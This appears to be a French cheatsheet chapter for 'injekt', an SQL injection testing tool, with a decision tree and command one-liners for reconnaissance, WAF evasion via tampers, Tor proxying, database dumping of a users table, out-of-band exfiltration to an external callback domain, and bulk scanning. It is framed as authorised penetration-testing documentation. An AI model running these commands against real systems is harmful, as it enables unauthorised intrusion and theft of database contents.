# 09 — Cheatsheet (arbre de décision + one-liners)

## 9.1 Arbre de décision (60 secondes)

```
Cible unique paramétrée ?
├─ Oui → --profile quick (-p id) → finding ? → oui : fingerprint forcé + union/extract (chap.5)
│                                  └─ non : balanced → WAF ? → chap.4 : matchers/level (chap.3.5)
├─ Host / domaine ? → recon crawl (50 pages) → import --test → recon scan stealth
├─ Liste / Burp / OpenAPI / Sitemap ? → --dry-run → bulk --threads 3 --output
├─ Blind total (pas de diff/erreur) ? → time isolé → json (si API) → OOB opt-in
├─ WAF actif ? → space2comment,randomcase → versioned*/mssqlblank → HPP → L2/L3 → STOP tracé
└─ Preuve minimale ? → -b/--current-user/--current-db → --dbs → --tables → --columns → --dump --start 0 --stop 5
```

## 9.2 One-liners par phase

```bash
# Sanity + plan :
injekt --no-banner info
injekt --target "https://example.com/?id=1" --profile stealth --dry-run

# Recon :
injekt recon crawl --target "example.com" --depth 2 --max-pages 100
injekt recon scan --target "example.com" --auto-enumerate --dbs
injekt recon import --file discovered.json --test --enumerate

# Scan :
injekt --target "https://example.com/?id=1" --profile quick
injekt --target "https://example.com/?id=1" --techniques boolean,error --dbms mysql
injekt --target "https://example.com/?id=1" --techniques time --dbms postgres
injekt --target "https://example.com/?id=1" --techniques json --dbms mysql
injekt --target "https://example.com/search" --method POST --data "q=test" --techniques boolean,error

# Évasion :
injekt --target "https://example.com/?id=1" --tamper space2comment,randomcase --techniques boolean,union
injekt --target "https://example.com/?id=1" --tamper versionedcomment,charencode --dbms mysql
injekt --target "https://example.com/?id=1" --hpp --techniques boolean
injekt --target "https://example.com/search" --method POST --data "q=test" --chunked --techniques boolean
injekt --target "https://example.com/?id=1" --prefix "')" --suffix "-- -" --safe-chars "()," 

# Robustesse détection :
injekt --target "https://example.com/?id=1" --text-only --not-string "captcha" --ignore-code 429,503 --code 200
injekt --target "https://example.com/?id=1" --level 2 --fetch-using boolean

# OPSEC :
injekt --target "https://example.com/?id=1" --proxy socks5h://127.0.0.1:9050 --jitter "750,250" --rate-limit 5
injekt --target "http://192.168.1.10/?id=1" --allow-private   # lab uniquement

# Exploitation (opt-in) :
injekt --target "https://example.com/?id=1" --extract -b --current-user --current-db --hostname
injekt --target "https://example.com/?id=1" --extract --dbs
injekt --target "https://example.com/?id=1" --extract --tables --db shop
injekt --target "https://example.com/?id=1" --extract --columns --db shop --table users
injekt --target "https://example.com/?id=1" --extract --dump --db shop --table users --column email --start 0 --stop 5

# OOB (opt-in, infra perso) :
injekt --target "https://example.com/?id=1" --oob-domain x.oastify.com \
  --oob-poll-url "https://x.oastify.com/poll/{token}" --techniques oob --oob-wait-secs 10

# Pipeline & masse :
injekt auto --target "https://example.com/?id=1" --output report.json
injekt auto --target example.com --with-recon --auto-enumerate
injekt --bulk-file targets.txt --output bulk-report.json --threads 3
injekt --raw-file req.txt --threads 5
injekt --openapi-file openapi.json --dry-run && injekt --openapi-file openapi.json --output report.json

# Persistance / rapports :
injekt --target "https://example.com/?id=1" --output report.json
injekt --target "https://example.com/?id=1" --export-encrypted ./session.enc
INJEKT_PASSPHRASE='...' injekt replay --file ./session.enc
```

## 9.3 Références rapides

**Profils** : `quick` (10t/20rps/200,100/L1/bool+err) · `balanced` (5/10/750,250/L1/all) ·
`stealth` (2/3/1200,400/L1/bool+err) · `aggressive` (8/10/500,200/L3/all).
Précédence : CLI > env > fichier > profil > défauts.

**Tampers (24)** : `space2comment space2plus space2tab space2newline space2randomblank
space2dash space2mssqlblank randomcase versionedcomment versionedmorekeywords
betweencomment randomcomments equaltolike charencode doubleurlencode hexencode
unicodeencode overlongutf8 space2paren versionedfuzz jsonunicodeescape
numericobfuscate linecomment base64encode(opt-in)`
(+ presets `cloudflare-generic`/`aggressive`).

**DBMS** : `mysql postgres mssql oracle` (+ alias `mariadb/pg/sqlserver/ora`).

**Exit** : `0` OK (même sans finding) · `1` runtime · `2` usage.
**Limites** : bulk 1000 · depth 16 · pages 100 000 · `max-per-template` 3 ·
level 5 · passphrase 12 · recon timeout 15 s · rate 10/s · jitter 750,250 ms (plancher 200).

**Fichiers** : `0o600` Unix, `--force` pour écraser/absolu, `report.json` jamais committé.

## 9.4 Mission type (copier-coller adaptable)

```bash
export T="https://cible-autorisee.com/produit?id=1"
# 1. Plan :
injekt --target "$T" --profile stealth --dry-run
# 2. Pilote discret :
injekt --target "$T" --profile quick -p id --output 01-pilote.json
# 3. Élargi si négatif :
injekt --target "$T" --profile balanced --output 02-balanced.json
# 4. Évasion si WAF :
injekt --target "$T" --tamper space2comment,randomcase --level 2 --output 03-evasion.json
# 5. Preuve d'impact (si finding) :
injekt --target "$T" --extract -b --current-user --current-db --output 04-identity.json
# 6. Carto minimale :
injekt --target "$T" --extract --dbs --output 05-dbs.json
# 7. Re-test post-fix par l'équipe adverse :
injekt recon import --file discovered.json --test --output 06-retest.json
```
